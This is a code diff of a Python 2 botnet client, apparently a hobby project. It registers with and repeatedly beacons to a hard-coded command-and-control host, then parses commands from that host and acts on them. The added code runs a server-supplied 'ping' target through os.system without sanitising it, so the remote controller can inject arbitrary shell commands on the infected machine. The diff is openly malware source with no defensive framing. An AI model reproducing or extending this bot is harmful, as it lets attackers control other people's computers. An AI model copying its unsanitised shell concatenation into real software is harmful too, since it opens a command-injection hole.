@@ -1,4 +1,4 @@
-import httplib, urllib, socket, hashlib, time, platform
+import httplib, urllib, socket, hashlib, time, platform, os
 from string import ascii_uppercase, ascii_lowercase, digits
 from itertools import product
 
@@ -12,9 +12,34 @@ class Bot(object):
         self.c2 = 'cgboal.xyz'
         print self.register()
         self.quit = False
-        while not quit:
-            time.sleep(5)
-            self.beacon()
+        self.main()
+
+
+
+    def main(self):
+        time.sleep(2)
+        prev = None
+        while not self.quit:
+            resp = self.beacon()
+            print resp
+            cmd = self.parseCmd(resp)
+            if cmd != None:
+                 if cmd[0] == self.id or cmd[0] == '*' and resp != prev:
+                    prev = resp
+                    if cmd[1] == 'ping':
+                        params = {'botId': self.id, 'botName' : self.hostname, 'host': cmd[2], 'up': False}
+                        alive = os.system("ping -c 3 " + cmd[2])
+                        if alive == 0:
+                            print '[+]Host Up'
+                            params['up'] = True
+                        self.post(params, '/ping/')
+                    elif cmd[1] == 'quit':
+                        self.quit = True
+                 time.sleep(10)
+            else:
+                time.sleep(2)
+
+
 
 
     def register(self):
@@ -27,7 +52,12 @@ class Bot(object):
         bParams = {'botId' : self.id, 't' : t}
         return self.post(bParams, '/beacon/').read()
 
-
+    def parseCmd(self, resp):
+        if "DOCTYPE" in resp:
+            return None
+        resp.strip()
+        cmd = resp.split('::')
+        return cmd
 
     def post(self, params, path):
         conn = httplib.HTTPConnection(self.c2)
